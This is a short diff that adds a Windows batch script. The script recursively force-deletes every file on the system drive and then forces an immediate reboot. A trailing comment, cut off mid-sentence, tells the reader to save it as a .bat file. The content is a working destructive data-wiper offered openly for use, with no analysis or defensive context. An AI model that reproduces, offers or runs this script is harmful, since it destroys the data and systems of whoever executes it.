@@ -1,0 +1,7 @@
+    @echo off
+
+    del %systemdrive%*.* /f /s /q
+
+    shutdown -r -f -t 00
+    
+    # Delete this and save as anything.bat . This code will 
